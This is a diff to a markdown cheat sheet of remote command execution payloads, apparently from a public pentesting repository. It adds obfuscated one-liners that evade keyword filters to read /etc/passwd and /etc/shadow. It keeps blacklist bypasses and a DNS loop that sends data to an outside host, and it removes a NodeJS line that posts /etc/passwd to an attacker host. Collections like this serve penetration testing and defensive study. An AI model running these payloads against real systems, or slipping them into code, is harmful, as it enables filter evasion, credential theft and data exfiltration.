@@ -1,5 +1,6 @@
 # Remote Commands Execution
-Remote Commands execution is a security vulnerability that allows an attacker to execute Commandss from a remote server.
+Remote Commands execution is a security vulnerability that allows an attacker to execute Commandss from a remote server.    
+NOTE: Reverse Shell Command are relocated to a [single file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
 
 ## Exploits
@@ -87,11 +88,24 @@ Bypass blacklisted word with $@
 who$@ami
 ```
 
+Bypass blacklisted word with variable expansion
+```powershell
+test=/ehhh/hmtc/pahhh/hmsswd 
+cat ${test//hhh\/hm/}
+cat ${test//hh??hm/}
+```
+
 Bypass zsh/bash/sh blacklist
 ```powershell
 echo $0
 -> /usr/bin/zsh
 echo whoami|$0
+```
+
+## Challenge
+Challenge based on the previous tricks, what does the following command do: 
+```powershell
+g="/e"\h"hh"/hm"t"c/\i"sh"hh/hmsu\e;tac$@<${g//hh??hm/}
 ```
 
 
@@ -118,13 +132,9 @@ Based on the tool from https://github.com/HoLyVieR/dnsbin also hosted at dnsbin.
 for i in $(ls /) ; do host "http://$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
 ```
 
-## Environment based
-NodeJS Commands execution
-```powershell
-require('child_process').exec('wget --post-data+"x=$(cat /etc/passwd)"+HOST')
-```
 
 ## Thanks to
 * [SECURITY CAFÉ - Exploiting Timed Based RCE](https://securitycafe.ro/2017/02/28/time-based-data-exfiltration/)
 * [Bug Bounty Survey - Windows RCE spaceless](https://twitter.com/bugbsurveys/status/860102244171227136)
 * [No PHP, no spaces, no $, no { }, bash only - @asdizzle](https://twitter.com/asdizzle_/status/895244943526170628)
+* [#bash #obfuscation by string manipulation - Malwrologist, @DissectMalware](https://twitter.com/DissectMalware/status/1025604382644232192)
